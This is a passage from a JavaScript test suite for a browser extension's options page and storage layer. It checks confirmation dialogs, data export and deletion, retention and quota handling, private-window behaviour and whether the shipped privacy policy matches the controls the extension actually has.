      setsAfter - setsBefore === 1, (setsAfter - setsBefore) + ' storage.sync.set call(s)');
    check('the debounced burst stored the LAST value, not the first',
      chrome.storage.sync.__data.get('historyLimit') === 17,
      String(chrome.storage.sync.__data.get('historyLimit')));

    /* The promise in the privacy policy, wired to a button, routed through the
       worker so anything in flight is aborted first. */
    await bg.sandbox.beginJob({ id: 1, windowId: 1 }, 'read-title');
    await tick();

    /* A keyboard user arrives on the button, then presses it — so focus really
       is on #clearBtn when the dialog opens, which is the state the restore
       assertion below is about. */
    dom.$('clearBtn').focus();
    dom.$('clearBtn').click();
    await tick(6);

    const dlg = dom.$('sk-confirm');
    check('a destructive action asks first, through the shared <dialog>',
      !!dlg && dlg.tagName === 'DIALOG' && dlg.open === true && dom.dialogOpens.length === 1,
      dlg ? 'open=' + dlg.open + ' modal=' + dom.dialogOpens[0].modal : 'no dialog');
    check('the dialog names and describes itself for assistive technology',
      !!dlg && dlg.getAttribute('aria-labelledby') === 'sk-confirm-title' &&
      dlg.getAttribute('aria-describedby') === 'sk-confirm-body',
      dlg ? dlg.getAttribute('aria-labelledby') + ' / ' + dlg.getAttribute('aria-describedby') : 'none');
    const dlgButtons = dlg ? dlg.find('button') : [];
    check('focus moved INTO the dialog, onto the least destructive button',
      dom.activeElement === dlgButtons[0] && dlgButtons[0].textContent === 'Cancel',
      dom.activeElement ? dom.activeElement.tagName + ' "' + dom.activeElement.textContent + '"' : 'nothing focused');
    check('the confirm button carries the danger styling, not the primary styling',
      dlgButtons[1] && dlgButtons[1].classList.contains('danger') && !dlgButtons[1].classList.contains('primary'),
      dlgButtons[1] ? dlgButtons[1].className : 'no confirm button');

    dlgButtons[0].click();          // Cancel
    await tick(8);
    check('cancelling deletes NOTHING — default deny',
      itemCount(bg) === 2 && bg.sandbox.SKJOBS.size() === 1,
      'items=' + itemCount(bg) + ' jobs=' + bg.sandbox.SKJOBS.size());
    check('focus RETURNED to the control that opened the dialog',
      dom.activeElement === dom.$('clearBtn'),
      dom.activeElement ? '#' + dom.activeElement.id : 'nothing focused');
    check('the dialog was removed from the page, not just hidden',
      dlg.parentNode === null, dlg.parentNode ? 'still attached' : 'detached');

    dom.$('clearBtn').focus();
    dom.$('clearBtn').click();
    await tick(6);
    dom.$('sk-confirm').find('button')[1].click();   // Delete everything
    await tick(20);
    check('"Delete everything" empties the store from the options page',
      itemCount(bg) === 0 && scratchCount(bg) === 0, 'items=' + itemCount(bg) + ' scratch=' + scratchCount(bg));
    check('it aborted the job that was in flight',
      bg.sandbox.SKJOBS.size() === 0, 'jobs=' + bg.sandbox.SKJOBS.size());
    check('the list re-renders as empty', dom.$('itemList').children.length === 0 &&
      /Nothing is stored/.test(dom.$('dataSummary').textContent), dom.$('dataSummary').textContent);
    check('the options page made no network call', page.net.length === 0, page.net.length + ' attempts');
  });

  /* ================================================================== */
  /* data — see it, keep it, remove it, and never lose it silently       */
  /* ================================================================== */
  /* "Anything stored is reachable and deletable" is a house rule, and a rule
     with no export is only half of it: a user who cannot get their data out has
     to choose between keeping it where they cannot read it and destroying it.
     This section grades the four things the options page owes the user, plus
     the two ways the data can disappear without anyone deciding to remove it —
     browser eviction, and a write that failed quietly. */
  await runSection('data', async () => {
    const chrome = H.makeChrome({ tabs: [{ id: 1, windowId: 1, active: true, title: 'x', url: 'https://a.example/' }] });
    const bg = H.loadBackground({ chrome });
    const NOW = Date.now();

    /* ---- retention: a COUNT CAP IS NOT A RETENTION POLICY ---- */
    await bg.sandbox.SKDB.put('items', { id: 'new', title: 'today', origin: 'https://a.example', createdAt: NOW - 1000 });
    await bg.sandbox.SKDB.put('items', { id: 'old', title: 'last year', origin: 'https://b.example', createdAt: NOW - 400 * 86400000 });
    await bg.sandbox.SKDB.put('items', { id: 'undated', title: 'no date', origin: 'https://c.example' });
    await tick();
    const swept = await bg.sandbox.SKDB.trimItemsByAge(30, NOW);
    await tick();
    const kept = bg.idb.indexedDB.__rows(DB_NAME, 'items').map(r => r.id).sort();
    check('retention removes a row older than retentionDays and leaves a fresh one',
      swept === 1 && kept.indexOf('old') < 0 && kept.indexOf('new') >= 0, 'kept: ' + kept.join(','));
    check('an UNDATED item row is kept, unlike an undated scratch row — items are listed, so the user can deal with it',
      kept.indexOf('undated') >= 0,
      'deleting a visible row on a guess would be losing data silently');
    check('retentionDays 0 means no age limit at all, and sweeps nothing',
      (await bg.sandbox.SKDB.trimItemsByAge(0, NOW)) === 0, 'the count cap is then the only bound');

    /* ---- the scratch sweep predicate, on its own ----
       OWNERSHIP BEATS AGE, and it has to be tested here rather than through the
       worker: with JOB_TIMEOUT_MS below SCRATCH_TTL_MS the watchdog reaches a
       long job first, so the ownership guard is never the thing that saves it
       and removing the guard looked harmless. It stops being harmless the
       moment a tool raises its own timeout above the TTL, which is exactly the
       kind of edit a tool author makes without thinking about this file. */
    await bg.sandbox.SKDB.put('scratch', { k: 'live:00000', jobId: 'live', startedAt: NOW - 9999999 });
    await bg.sandbox.SKDB.put('scratch', { k: 'dead:00000', jobId: 'dead', startedAt: NOW - 9999999 });
    await tick();
    const sweptScratch = await bg.sandbox.SKDB.sweepScratch({ maxAgeMs: 1000, keepJobIds: ['live'], now: NOW });
    await tick();
    const scratchLeft = bg.idb.indexedDB.__rows(DB_NAME, 'scratch').map(r => r.jobId);
    check('an ANCIENT row belonging to a live job survives the sweep — ownership beats age',
      sweptScratch === 1 && scratchLeft.length === 1 && scratchLeft[0] === 'live',
      'swept ' + sweptScratch + ', left: ' + scratchLeft.join(','));
    await bg.sandbox.SKDB.sweepScratch({ maxAgeMs: 1000, keepJobIds: [], now: NOW });
    await tick();
    check('and the same row goes the moment its job is no longer in the table',
      scratchCount(bg) === 0, 'scratch=' + scratchCount(bg));

    /* ---- export: the shape, and what is NOT in it ---- */
    const payload = await bg.sandbox.SKDB.exportAll({ version: '9.9.9', now: NOW });
    check('the export carries a schema stamp, the tool, the version and a count',
      payload.schema >= 1 && payload.tool === DB_NAME && payload.version === '9.9.9' &&
      payload.count === payload.items.length && /^\d{4}-\d{2}-\d{2}T/.test(payload.exportedAt),
      'schema=' + payload.schema + ' tool=' + payload.tool + ' count=' + payload.count);
    check('the export round-trips EVERY stored row',
      payload.items.length === itemCount(bg) &&
      payload.items.map(r => r.id).sort().join(',') === kept.join(','),
      payload.items.length + ' of ' + itemCount(bg));
    check('the export is JSON-serialisable — nothing in it turns into {} on the way to a file',
      JSON.parse(JSON.stringify(payload)).items.length === payload.items.length, 'survives a round trip');
    await bg.sandbox.SKDB.put('scratch', { k: 'j1:00000', jobId: 'j1', startedAt: NOW });
    await tick();
    const payload2 = await bg.sandbox.SKDB.exportAll({ now: NOW });
    check('the export contains NO scratch — in-flight fragments are not the user\'s data yet',
      JSON.stringify(payload2).indexOf('j1:00000') < 0 && !('scratch' in payload2),
      Object.keys(payload2).join(','));
    await bg.sandbox.SKDB.clear('scratch');

    /* ---- quota: never lose data silently ----
       THERE ARE TWO WRITES IN A RUN and they fail differently, so both are
       driven. The job writes its scratch row first and the row the user asked
       to keep second; failing only the next put exercises the first path and
       leaves the second — the one that loses the user's actual result —
       completely ungraded. That is how a swallowed items-write survived the
       first teeth run of this very section. */
    const { chrome: cq, bg: bq } = boot();
    await tick();
    await cq.storage.sync.set({ keepHistory: true });
    bq.idb.indexedDB.__failNext('put');          // a real QuotaExceededError, name and code
    const fullBegin = await bq.send({ type: 'SK_TAB_INFO', tabId: 1 });
    await tick(4);
    check('a job that cannot even write its scratch row fails with the storage-full sentence',
      fullBegin.ok === false && fullBegin.error === 'reasonStorageFull',
      JSON.stringify(fullBegin));

    bq.idb.indexedDB.__failNext('put', undefined, 1);   // scratch succeeds, the KEPT row fails
    const full = await bq.send({ type: 'SK_TAB_INFO', tabId: 1 });
    await tick(4);
    check('a disk-full write of the row the user asked to KEEP is not reported as success either',
      full.ok === false && full.error === 'reasonStorageFull' &&
      !!cq.__i18nCatalogue.reasonStorageFull,
      JSON.stringify(full));
    check('nothing was quietly kept from the failed run',
      itemCount(bq) === 0, 'items=' + itemCount(bq));
    check('the storage-full sentence is actionable — it names where to go and free some room',
      /Options/.test(cq.__i18nCatalogue.reasonStorageFull.message) &&
      /nothing was saved/i.test(cq.__i18nCatalogue.reasonStorageFull.message),
      cq.__i18nCatalogue.reasonStorageFull.message);
    const noteQ = cq.storage.session.__data.get('skLastError');
    check('the disk-full reason is what gets PARKED too, not the generic shrug',
      !!noteQ && noteQ.reason === 'reasonStorageFull', JSON.stringify(noteQ));
    check('and the failed job still cleaned up after itself',
      bq.sandbox.SKJOBS.size() === 0 && scratchCount(bq) === 0,
      'jobs=' + bq.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(bq));

    /* The classifier reads name/code, never prose — which is what makes it
       legitimate next to the allowlist rule rather than a violation of it. */
    const isQ = bg.sandbox.SKDB.isQuotaError;
    check('the quota classifier reads DOMException.name and .code, both of which are enumerated values',
      isQ({ name: 'QuotaExceededError' }) && isQ({ code: 22 }) &&
      isQ({ error: { name: 'QuotaExceededError' } }),
      'name, legacy code 22, and the transaction-wrapped form');
    check('it does NOT classify on the message — an engine sentence is never parsed here',
      !isQ({ message: 'QuotaExceededError: the quota has been exceeded' }) &&
      !isQ(new Error('quota')) && !isQ(null) && !isQ('QuotaExceededError'),
      'prose is not a signal');
    check('lib/storage.js never reads .message when classifying',
      !/isQuotaError[\s\S]{0,600}?\.message/.test(H.readRoot('lib/storage.js')),
      'name and code only');

    /* ---- durability: BOTH branches, and never a guess ---- */
    for (const [persisted, wantKey, why] of [[true, 'dataDurable', 'granted'], [false, 'dataBestEffort', 'not granted']]) {
      const dom = H.makeDom({ html: ['pages/options.html'], persisted });
      const page = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom });
      const got = await page.sandbox.skDurabilityKey();
      check('durability reports "' + wantKey + '" when the browser says persistence is ' + why,
        got === wantKey, got);
    }
    const domNo = H.makeDom({ html: ['pages/options.html'], noStorageManager: true });
    const pageNo = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom: domNo });
    check('a browser with no StorageManager is reported as UNKNOWN and treated as temporary — never as durable',
      (await pageNo.sandbox.skDurabilityKey()) === 'dataDurabilityUnknown' &&
      /temporary/.test(chrome.__i18nCatalogue.dataDurabilityUnknown.message),
      chrome.__i18nCatalogue.dataDurabilityUnknown.message);
    check('the best-effort sentence says the browser MAY CLEAR IT and tells the user to export',
      /may clear this/.test(chrome.__i18nCatalogue.dataBestEffort.message) &&
      /[Ee]xport a backup/.test(chrome.__i18nCatalogue.dataBestEffort.message),
      chrome.__i18nCatalogue.dataBestEffort.message);
    const durabilityKeys = scanCode(/'(dataDurable|dataBestEffort|dataDurabilityUnknown)'/, ['.js']);
    check('no shipped file decides the durability WORDING for itself — one function returns one of three keys',
      durabilityKeys.length > 0 && durabilityKeys.every(h => h.indexOf('pages/common.js') === 0),
      durabilityKeys.map(h => h.split(':')[0]).filter((v, i, a) => a.indexOf(v) === i).join(' '));

    /* ---- persist(): asked once, from a window, and only where it works ---- */
    const domP = H.makeDom({ html: ['pages/options.html'], persisted: false });
    const pageP = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome: H.makeChrome({}), dom: domP });
    const first = await pageP.sandbox.skRequestPersistence();
    const second = await pageP.sandbox.skRequestPersistence();
    check('persist() is REQUESTED, and the answer is reported rather than assumed',
      first.supported === true && first.asked === true && first.persisted === true,
      JSON.stringify(first));
    check('a second call does not ask again once the browser has GRANTED it',
      domP.persistCalls.length === 1 && second.asked === false,
      domP.persistCalls.length + ' persist() call(s)');

    /* THE BRANCH THE ONCE-FLAG ACTUALLY EXISTS FOR. When the browser GRANTS,
       persisted() answers true forever and any implementation looks correct.
       When it REFUSES, persisted() stays false, and only the recorded flag
       stops the request being made again on every single page load. */
    const domP2 = H.makeDom({ html: ['pages/options.html'], persisted: false, persistGrants: false });
    const cP2 = H.makeChrome({});
    const pageP2 = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome: cP2, dom: domP2 });
    const refused2 = await pageP2.sandbox.skRequestPersistence();
    const refused3 = await pageP2.sandbox.skRequestPersistence();
    check('a REFUSED request is recorded honestly as not persisted, and still counts as asked',
      refused2.persisted === false && refused2.asked === true &&
      cP2.storage.local.__data.get('skPersistAsked') === true,
      JSON.stringify(refused2));
    check('and a REFUSED request is never repeated — the flag, not persisted(), is what stops the nagging',
      domP2.persistCalls.length === 1 && refused3.asked === false,
      domP2.persistCalls.length + ' persist() call(s) after two loads');
    check('the "already asked" flag is LOCAL — durability is per device, so syncing it would strand the second machine',
      cP2.storage.local.__data.has('skPersistAsked') && !cP2.storage.sync.__data.has('skPersistAsked'),
      'local only');
    /* Over CODE, not prose: several files' comments explain that this API is
       Window-only, and a scan that read those would be red on the paragraph
       stating the rule. */
    const persistHits = scanCode(/storage\.persist\s*\(|storage\.persisted\s*\(/, ['.js']);
    check('nothing asks for persistence outside a page — it is a Window-only API and the worker would get undefined',
      persistHits.length > 0 && persistHits.every(h => h.indexOf('pages/') === 0),
      persistHits.map(h => h.split(':')[0]).filter((v, i, a) => a.indexOf(v) === i).join(' ') || 'none');
    check('and the worker and the shared libraries never touch navigator.storage at all',
      scanCode(/navigator\.storage/, ['.js'])
        .filter(h => h.indexOf('background.js') === 0).length === 0,
      'background.js is clean');

    /* ---- the options page, end to end ---- */
    const { chrome: co, bg: bo } = boot();
    await tick();
    await bo.sandbox.SKDB.put('items', { id: 'r1', title: HOSTILE_TITLE, origin: 'https://bank.example', createdAt: NOW - 1000 });
    await bo.sandbox.SKDB.put('items', { id: 'r2', title: 'second', origin: 'https://ok.example', createdAt: NOW - 2000 });
    await tick();
    /* persistGrants:false — the browser REFUSES. That is the branch that must
       be told honestly, and it is the branch nobody screenshots. */
    const dom = H.makeDom({ html: ['pages/options.html'], persisted: false, persistGrants: false, usage: 2560, quota: 10485760 });
    const page = H.loadPage(['lib/settings.js', 'lib/storage.js', 'pages/common.js', 'pages/options.js'],
      { chrome: co, idb: bo.idb, dom });
    await dom.ready();
    await tick(14);

    check('opening the options page asks the browser for persistent storage, exactly once',
      dom.persistCalls.length === 1, dom.persistCalls.length + ' persist() call(s)');
    check('when the browser REFUSES, the page says best-effort — it never reports durable on a guess',
      /Best effort/.test(dom.$('dataDurability').textContent), dom.$('dataDurability').textContent);
    check('and it reports how much space is in use, in the UI locale',
      /2\.5 kB|2\.5 KB/.test(dom.$('dataDurability').textContent), dom.$('dataDurability').textContent);
    check('the durability line is a role="status" region, because it changes after the page loads',
      dom.$('dataDurability').getAttribute('role') === 'status', dom.$('dataDurability').getAttribute('role'));

    /* Per-row delete: the list was already rendered, so this costs a button. */
    const rowButtons = dom.$('itemList').find('button');
    check('every listed row carries its own delete control',
      rowButtons.length === 2, rowButtons.length + ' row buttons for ' + dom.$('itemList').children.length + ' rows');
    check('each one is NAMED BY ITS ROW, so a screen reader user is not choosing between identical "Delete" buttons',
      rowButtons[0].getAttribute('aria-label') === 'Delete the row from https://bank.example' &&
      rowButtons[1].getAttribute('aria-label') === 'Delete the row from https://ok.example',
      rowButtons.map(b => b.getAttribute('aria-label')).join(' | '));
    rowButtons[0].click();
    await tick(12);
    check('deleting ONE row removes exactly that row',
      itemCount(bo) === 1 && bo.idb.indexedDB.__rows(DB_NAME, 'items')[0].id === 'r2',
      'left: ' + bo.idb.indexedDB.__rows(DB_NAME, 'items').map(r => r.id).join(','));
    check('the list and the summary both re-render after a single-row delete',
      dom.$('itemList').children.length === 1 && /1 row is stored/.test(dom.$('dataSummary').textContent),
      dom.$('dataSummary').textContent);

    /* Export, driven from the real button, and READ BACK from the blob. */
    dom.$('exportBtn').click();
    await tick(12);
    const blob = dom.objectUrls[dom.objectUrls.length - 1];
    const written = blob ? JSON.parse(await blob.text()) : null;
    check('the export button writes a real file, and it is valid JSON',
      !!written && written.schema >= 1, blob ? blob.type + ' ' + blob.size + ' bytes' : 'no blob');
    check('the exported file contains the row that is still stored',
      !!written && written.items.length === 1 && written.items[0].id === 'r2',
      written ? JSON.stringify(written.items.map(r => r.id)) : 'nothing written');
    const dl = co.__lastCall('downloads.download');
    check('the filename is locale-independent functional output — an ISO-ish date, no localised month',
      !!dl && /^skeleton-export-\d{4}-\d{2}-\d{2}-\d{2}-\d{2}-\d{2}\.json$/.test(dl.args[0].filename),
      dl ? dl.args[0].filename : 'no download');
    check('the export made no network call', page.net.length === 0, page.net.length + ' attempts');

    /* Reset settings: the one category of data that can LEAVE the machine is
       now the one category the user can take back. */
    await co.storage.sync.set({ historyLimit: 3, keepHistory: true, theme: 'dark' });
    dom.$('resetBtn').focus();
    dom.$('resetBtn').click();
    await tick(8);
    const dlg = dom.$('sk-confirm');
    check('"Reset settings" asks first, through the same shared dialog',
      !!dlg && dlg.open === true && dlg.find('button')[1].classList.contains('danger'),
      dlg ? 'open, danger confirm' : 'no dialog');
    dlg.find('button')[0].click();      // Cancel
    await tick(8);
    check('cancelling changes NOTHING — default deny, on settings too',
      co.storage.sync.__data.get('historyLimit') === 3, String(co.storage.sync.__data.get('historyLimit')));
    dom.$('resetBtn').click();
    await tick(4);
    dom.$('sk-confirm').find('button')[1].click();
    await tick(14);
    check('confirming puts every setting back to its default',
      co.storage.sync.__data.get('historyLimit') === bo.sandbox.SK_DEFAULTS.historyLimit &&
      co.storage.sync.__data.get('keepHistory') === false,
      JSON.stringify(Object.fromEntries(co.storage.sync.__data)));
    check('and the form on screen repaints to match what is actually stored',
      dom.$('historyLimit').value === bo.sandbox.SK_DEFAULTS.historyLimit &&
      dom.$('keepHistory').checked === false,
      'limit=' + dom.$('historyLimit').value + ' keepHistory=' + dom.$('keepHistory').checked);
    check('resetting settings did NOT touch the stored rows — the two promises are separate',
      itemCount(bo) === 1, 'items=' + itemCount(bo));

    /* THE CLAMP WRITE-BACK. The bug this family already shipped once: storage
       holds 1000, the box still shows 999999, and "what am I actually running?"
       becomes unanswerable. */
    dom.$('historyLimit').value = '999999';
    dom.$('historyLimit').__fire('input');
    await sleep(420); await tick(12);
    check('a clamped value is written BACK INTO THE INPUT, so the form cannot display a value that is not in effect',
      dom.$('historyLimit').value === 1000 && co.storage.sync.__data.get('historyLimit') === 1000,
      'input=' + dom.$('historyLimit').value + ' stored=' + co.storage.sync.__data.get('historyLimit'));

    /* A settings write that fails must SAY SO. The note is cleared by hand
       first: it is hidden by a 1200 ms timer, and asserting on a class that the
       PREVIOUS successful save is still displaying would be asserting on the
       clock rather than on the failure. */
    dom.$('saveNote').classList.remove('show');
    co.__failOnce('storage.sync.set', new Error('MAX_WRITE_OPERATIONS_PER_MINUTE quota exceeded'));
    dom.$('historyLimit').value = '42';
    dom.$('historyLimit').__fire('input');
    await sleep(420); await tick(12);
    const toast = dom.$('sk-toast');
    check('a failed settings write shows a failure and does NOT claim "Saved"',
      !!toast && toast.textContent === 'Could not save that setting' &&
      !dom.$('saveNote').classList.contains('show'),
      toast ? '"' + toast.textContent + '"' : 'no toast');
    check('and the form repaints to what IS stored, not to what was typed',
      dom.$('historyLimit').value === 1000, 'input=' + dom.$('historyLimit').value);
    check('no unhandled rejection escaped the failing save',
      !/UnhandledPromiseRejection/.test(page.logText()), 'skSetSettings answers, it never throws');

    /* ---- THE CLAIMS ON SCREEN MUST BE TRUE OF THE CODE ---- */
    /* The options page used to say "works entirely on your device" in the About
       box and "synced to your browser profile" four sections above it. Both
       could not be true, and the privacy policy gets written from this copy —
       so the inaccuracy would propagate from the skeleton into 67 hosted
       policy documents. A reviewer reading the two sentences next to a manifest
       declaring `storage` marks the item as misleading. */
    const catalogue = co.__i18nCatalogue;
    const claims = Object.keys(catalogue).map(k => catalogue[k].message).join('\n');
    const writesSync = scanCode(/storage\.sync\.set\s*\(/, ['.js']).length > 0;
    check('no shipped string claims the tool works ENTIRELY on your device while settings are written to sync',
      !(writesSync && /entirely on your (device|machine|computer)/i.test(claims)),
      writesSync ? 'sync is written, and no string overclaims' : 'nothing is synced');
    check('the privacy claim still names what it rules out — dropping the negations would be the other failure',
      /no account/i.test(catalogue.aboutBlurb.message) &&
      /no tracking/i.test(catalogue.aboutBlurb.message) &&
      /no network calls/i.test(catalogue.aboutBlurb.message),
      catalogue.aboutBlurb.message);
    check('the settings sentence says the BROWSER\'s sync carries them, and that they never come to us',
      /sync/i.test(catalogue.optionsLead.message) && /never sent to us/i.test(catalogue.optionsLead.message),
      catalogue.optionsLead.message);

    /* The hosted policy is a hard store-submission gate, and a policy that
       promises a control the product does not have is worse than none. */
    check('publish/PRIVACY-POLICY.html exists, ready to be filled in and hosted',
      H.existsRoot('publish/PRIVACY-POLICY.html'), 'the Web Store will not publish without a policy URL');
    if (H.existsRoot('publish/PRIVACY-POLICY.html')) {
      const policy = H.readRoot('publish/PRIVACY-POLICY.html');
      const optHtmlNow = H.readRoot('pages/options.html');
      /* The policy QUOTES button labels, so the comparison has to be against
         the label the user actually sees — the catalogue — and not against the
         English fallback sitting in the markup. Renaming a button and leaving
         the hosted policy promising the old one is the realistic drift, and a
         check that read the html would not see it. */
      const promised = [
        ['Export everything', 'exportBtn', 'optExportButton'],
        ['Delete everything', 'clearBtn', 'optDeleteAllButton'],
        ['Reset settings', 'resetBtn', 'optResetButton']
      ];
      const missingControl = promised.filter(([phrase, id, key]) =>
        policy.indexOf(phrase) < 0 ||
        optHtmlNow.indexOf('id="' + id + '"') < 0 ||
        !catalogue[key] || catalogue[key].message !== phrase);
      check('every control the policy promises exists, and is still CALLED what the policy calls it',
        missingControl.length === 0,
        missingControl.map(p => p[0] + ' -> ' + ((catalogue[p[2]] || {}).message || 'no such key')).join(', ') ||
        promised.map(p => p[0]).join(' · '));
      check('the policy describes the storage architecture the skeleton actually ships',
        ['chrome.storage.sync', 'chrome.storage.local', 'chrome.storage.session', 'IndexedDB']
          .every(s => policy.indexOf(s) >= 0),
        'all four stores named');
      check('the policy is NOT shipped in the extension — publish/ is excluded from the tree the sim scans',
        !H.shippedFiles(['.html']).some(f => f.indexOf('publish/') === 0),
        H.shippedFiles(['.html']).join(' '));
      /* Whitespace-collapsed before matching: prose reflows, and a check that
         breaks when a paragraph is rewrapped is a check that gets deleted. */
      const flat = policy.replace(/\s+/g, ' ');
      check('the policy makes the Limited Use disclosure the Web Store requires',
        /Limited Use/.test(flat) && /Chrome Web Store User Data Policy/.test(flat),
        'present, and reachable within one click of the policy page');
    }

    /* ================================================================
       PRIVATE BROWSING
       ================================================================
       The exposure only opens once the user ticks "Allow in Incognito" —
       which is exactly the user who cares most, and who has the strongest
       expectation that nothing persists. With "incognito": "spanning" (the MV3
       default, declared out loud in the manifest) there is ONE worker, ONE
       IndexedDB and ONE settings store across both kinds of window, so a tool
       that never looks at tab.incognito writes private page content into the
       same listed, permanent store as everything else.

       Nothing here refuses to WORK in a private window. What changes is what
       is KEPT, and whether the user is told. */
    {
      const { chrome, bg } = boot();
      await tick();
      await chrome.storage.sync.set({ keepHistory: true });
      await tick();

      const normal = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 });
      check('with keepHistory ON, an ordinary window DOES store its result',
        normal.ok === true && normal.kept === true && itemCount(bg) === 1,
        'items=' + itemCount(bg));

      const priv = await bg.send({ type: 'SK_TAB_INFO', tabId: 18 });
      check('the run in a PRIVATE window still succeeds — private is not "broken"',
        priv.ok === true && priv.title === 'Private Page', JSON.stringify(priv.error || priv.title));
      check('but it writes NOTHING to the store the options page lists',
        itemCount(bg) === 1, itemCount(bg) + ' row(s) — the private one is not among them');
      check('and it says so, rather than silently doing something different',
        priv.kept === false && priv.incognito === true,
        JSON.stringify({ kept: priv.kept, incognito: priv.incognito }));
      const stored = await bg.sandbox.SKDB.getAll('items');
      check('no private origin and no private title reached the store',
        !JSON.stringify(stored).includes('private.example') && !JSON.stringify(stored).includes(SECRET),
        stored.map(r => r.origin).join(' '));

      check('the private run left no scratch behind either',
        scratchCount(bg) === 0, scratchCount(bg) + ' scratch row(s)');

      /* THE JOB RECORD IS WRITTEN TO storage.session AND READ BACK BY A LATER
         WORKER INSTANCE, so it is subject to the same rule as the failure note
         — and it is the write that is easiest to forget, because nobody
         thinks of in-flight bookkeeping as data. It survives the private
         window that produced it; a private host sitting in it is a private
         host on the machine after the window has gone.
         MISSED ON THE FIRST TEETH RUN: reverting the job record alone changed
         nothing, because every other check looked at `items` and at the note. */
      const pj = await bg.sandbox.beginJob(
        { id: 18, windowId: 6, incognito: true, url: 'https://private.example/x?t=' + SECRET }, 'read-title');
      const mirror = JSON.stringify(chrome.storage.session.__data.get('skJobs') || {});
      check('an in-flight job record from a private window carries NO ORIGIN',
        pj.origin === '' && pj.incognito === true && mirror.indexOf('private.example') < 0,
        mirror);
      check('and the mirror it is written to carries no private host either',
        mirror.indexOf(SECRET) < 0 && mirror.indexOf('private') < 0,
        'storage.session holds ' + mirror.length + ' bytes, none of them a private host');
      bg.sandbox.abortJob(18, 'end of the private-window fixture');
      await tick(2);

      /* THE NOTE IS THE OTHER LEAK, and it is the worse one: it is the only
         thing this product writes that survives the window that produced it
         and is then shown on top of a DIFFERENT tab. */
      await bg.sandbox.recordError('read-title', 'reasonNoTitle',
        { id: 18, incognito: true, url: 'https://private.example/x?t=' + SECRET });
      const note = chrome.storage.session.__data.get(bg.eval('LAST_ERROR_KEY'));
      check('a failure in a private window parks NO ORIGIN — the sentence still works without it',
        note && note.origin === '' && note.reason === 'reasonNoTitle',
        JSON.stringify(note));

      /* One predicate, so a tool adding a third write site does not have to
         rediscover the rule from first principles. */
      const bgSrc = stripJsComments(H.readRoot('background.js'));
      check('there is ONE predicate for "is this a private window", not a scattered tab.incognito',
        /function isPrivate\s*\(/.test(bgSrc) &&
        (bgSrc.match(/\.incognito\b/g) || []).length <= 2,
        'isPrivate(tab), used at every decision point');
      check('the manifest states its incognito mode rather than inheriting it silently',
        JSON.parse(H.readRoot('manifest.json')).incognito === 'spanning',
        'spanning — declared, so it is a decision and TEMPLATE §8 can explain "split"');
    }

    /* ================================================================
       "DELETE EVERYTHING" MEANS EVERY STORE, INCLUDING THE ONES THAT DO
       NOT EXIST YET
       ================================================================
       clearAll used to be two hard-coded lines beside a PLACEHOLDER(db-stores)
       telling every tool author to add their own stores and never mentioning
       this function — so following the instructions exactly produced a silent
       lie. The old test could not see it either: it counted items and scratch,
       and a third store full of page content passed green. */
    {
      const { chrome, bg } = boot();
      await tick();

      /* A tool's third store, created the way TEMPLATE §5.2 tells you to.
         Nothing in shipped code names it. */
      const dbName = DB_NAME;
      bg.idb.indexedDB.__addStore(dbName, 'thumbnails');
      await bg.sandbox.SKDB.put('items', { id: 'i1', title: 'kept', createdAt: Date.now() });
      await bg.sandbox.SKDB.put('scratch', { k: 'j:00000', jobId: 'j', startedAt: Date.now() });
      await bg.sandbox.SKDB.put('thumbnails', { id: 't1', blobish: 'a picture of an intranet' });
      check('the fixture really has a store the shipped code has never heard of',
        bg.idb.indexedDB.__count(dbName, 'thumbnails') === 1, 'thumbnails=1');

      const cleared = await bg.sandbox.SKDB.clearAll();
      check('clearAll ENUMERATES the database rather than naming two stores',
        cleared.length === 3 && cleared.indexOf('thumbnails') >= 0, cleared.join(', '));
      check('so a store the author added is emptied too — the promise cannot be forgotten',
        bg.idb.indexedDB.__count(dbName, 'thumbnails') === 0 &&
        itemCount(bg) === 0 && scratchCount(bg) === 0,
        'items=0 scratch=0 thumbnails=0');
      check('lib/storage.js names no store inside clearAll',
        !/clearAll\s*\([^)]*\)\s*\{[\s\S]{0,400}?clear\(\s*['"]/.test(stripJsComments(H.readRoot('lib/storage.js'))),
        'objectStoreNames, not a list');

      /* THE OTHER AREA A TOOL GROWS DATA IN. IndexedDB is where this family is
         TOLD to put payload; chrome.storage.local is where it ends up anyway,
         because it is the easiest thing to reach for. Stated as a SUBTRACTION,
         which is the only form that stays true as a tool grows: everything
         that is not a DECLARED SETTING is payload. */
      await chrome.storage.local.set({ skPersistAsked: true, cachedParse: 'https://intranet.acme.example/board' });
      await bg.send({ type: 'SK_CLEAR_DATA' });
      await tick(4);
      check('"Delete everything" also removes payload a tool left in storage.local',
        !chrome.storage.local.__data.has('cachedParse'),
        Array.from(chrome.storage.local.__data.keys()).join(',') || 'empty');
      check('and it KEEPS the declared settings, because the button says settings are kept',
        chrome.storage.local.__data.get('skPersistAsked') === true, 'skPersistAsked survived');
    }

    /* ================================================================
       SITE ACCESS — granted in one click, and until now revocable only by
       somebody who knew to go and look
       ================================================================
       Broad host access is the most consequential thing a user can hand a tool
       in this family. `chrome.permissions.request` is one click from inside the
       product; taking it back was four steps in a browser settings page nothing
       told them about. That asymmetry is the same "nowhere to go" failure the
       blocked-page sentences exist to prevent, applied to a privacy decision.

       The row is driven ENTIRELY by the manifest, so it can never claim a
       permission the tool has not declared — which is also what lets the
       skeleton ship it switched off, live and exercised, with no permission
       cost and nothing for a tool author to uncomment. */
    {
      /* (a) the skeleton as it ships: no optional host permissions declared. */
      const chromeA = H.makeChrome({ tabs: [{ id: 1, windowId: 1, active: true, title: 'x', url: 'https://a.example/' }] });
      const bgA = H.loadBackground({ chrome: chromeA });
      const domA = H.makeDom({ html: ['pages/options.html'] });
      H.loadPage(['lib/settings.js', 'lib/storage.js', 'pages/common.js', 'pages/options.js'],
        { chrome: chromeA, idb: bgA.idb, dom: domA });
      await domA.ready();
      await tick(12);
      check('with no optional_host_permissions declared, the whole section stays hidden',
        domA.$('siteAccessSection').hidden === true, 'hidden=' + domA.$('siteAccessSection').hidden);
      check('and NOTHING is requested — an invisible row must not be asking for anything',
        chromeA.__callsOf('permissions.request').length === 0 &&
        chromeA.__callsOf('permissions.contains').length === 0,
        chromeA.__callsOf('permissions.request').length + ' request(s)');

      /* (b) the same page, on a tool that declares them. Only the manifest
             changed — not one line of shipped code. */
